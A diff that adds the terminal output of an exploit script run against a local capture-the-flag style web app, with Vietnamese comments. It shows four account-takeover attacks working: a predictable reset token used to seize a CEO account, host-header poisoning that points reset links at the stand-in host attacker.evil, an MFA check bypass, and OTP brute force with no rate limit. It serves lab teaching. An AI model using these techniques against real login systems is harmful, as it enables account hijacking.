@@ -1,0 +1,29 @@
+$ python3 app.py        # terminal 1, lang nghe 127.0.0.1:8046
+ * Running on http://127.0.0.1:8046
+
+$ python3 exploit.py     # terminal 2
+[*] Man A: reset token doan duoc -> chiem ceo@corp.local
+    token tinh offline = 35fda2afc20b
+    /reset -> {'email': 'ceo@corp.local', 'flag': 'FLAG{4.5_reset_token_predictable}', 'message': 'password changed', 'ok': True}
+
+[*] Man B: host header poisoning (link reset tro ve attacker)
+    gui /forgot voi Host: attacker.evil
+    link reset tra ve: http://attacker.evil/reset?token=35fda2afc20b
+    link tro ve domain attacker? CO -> token ro ri
+
+[*] Man C: MFA bypass (missing check o /mfa/account)
+    qua buoc password, nhan mfa_token=22077d836d (stage=mfa_required)
+    /mfa/account (khong nhap OTP) -> {'flag': 'FLAG{4.5_mfa_bypassed}', 'note': 'truy cap duoc ma khong can nhap OTP', 'ok': True, 'user': 'bob@corp.local'}
+
+[*] Man D: OTP brute (khong rate limit)
+    [+] OTP dung = 2912 sau 2913 lan thu (khong bi chan)
+
+=== KET QUA ===
+  A reset takeover : OK flag=FLAG{4.5_reset_token_predictable}
+  B host poisoning : OK
+  C MFA missing-chk: OK flag=FLAG{4.5_mfa_bypassed}
+  D OTP brute      : OK flag=FLAG{4.5_mfa_bypassed}
+
+# Ghi chu: token reset o Man A va Man B giong het nhau (35fda2afc20b) vi deterministic
+# tu email -> suy ra offline. OTP o Man D la random moi lan chay nen so lan thu se khac,
+# nhung khong bao gio bi chan (khong rate limit).
